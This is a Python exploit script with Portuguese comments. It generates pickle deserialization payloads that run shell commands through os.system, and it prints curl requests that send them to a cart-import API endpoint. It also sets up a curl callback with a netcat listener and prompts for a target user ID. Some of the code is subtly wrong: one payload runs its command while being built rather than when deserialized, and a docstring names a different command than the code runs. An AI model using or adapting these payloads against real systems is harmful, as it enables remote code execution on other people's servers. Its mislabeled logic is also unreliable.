import pickle
import base64
import os


class RCE:
    def __reduce__(self):
        # Comando para executar
        cmd = ('hostname')
        return os.system, (cmd,)


class CartData:
    def __init__(self, user_id=1):
        self.user_id = user_id
        self.items = [
            {
                'product_id': 1,
                'quantity': 999,
                'name': 'Hacked Product',
                'description': 'This product was added via RCE',
                'price': 0.01
            }
        ]
    
    def __reduce__(self):
        # Executa comando malicioso durante a desserialização
        os.system('curl http://localhost:12345/hacked')
        # Retorna dados do carrinho para atualizar
        return (dict, (), None, None, {
            'user_id': self.user_id, 
            'items': self.items
        })


def export_cart():
    """Exporta dados do carrinho atual."""
    print("\nCurl Command para exportar carrinho:")
    print("""curl -X GET http://localhost:8000/api/cart/export \\
-H "Authorization: Bearer YOUR_TOKEN" """)


def import_cart(user_id=1):
    """Cria payload malicioso para importar."""
    # Cria carrinho malicioso que executa comando
    cart = CartData(user_id)
    payload = pickle.dumps(cart)
    b64_payload = base64.b64encode(payload).decode()
    
    print("\nBase64 Payload:")
    print(b64_payload)
    
    print("\nCurl Command para importar carrinho:")
    print(f"""curl -X POST http://localhost:8000/api/cart/import \\
-H "Content-Type: application/json" \\
-H "Authorization: Bearer YOUR_TOKEN" \\
-d '{{"cart_data": "{b64_payload}"}}'""")
    
    print("\nLembre de iniciar o servidor de callback:")
    print("nc -lvp 12345")


def test_rce():
    """Testa RCE básico com whoami."""
    payload = pickle.dumps(RCE())
    b64_payload = base64.b64encode(payload).decode()
    
    print("\nBase64 Payload:")
    print(b64_payload)
    
    print("\nCurl Command:")
    print(f"""curl -X POST http://localhost:8000/api/cart/import \\
-H "Content-Type: application/json" \\
-H "Authorization: Bearer YOUR_TOKEN" \\
-d '{{"cart_data": "{b64_payload}"}}'""")


if __name__ == "__main__":
    print("1. Exportar carrinho atual")
    print("2. Importar carrinho malicioso (com RCE)")
    print("3. Testar RCE básico (whoami)")
    
    choice = input("\nEscolha uma opção (1-3): ")
    
    if choice == '1':
        export_cart()
    elif choice == '2':
        user_id = int(input("ID do usuário alvo: "))
        import_cart(user_id)
    elif choice == '3':
        test_rce()
    else:
        print("Opção inválida!") 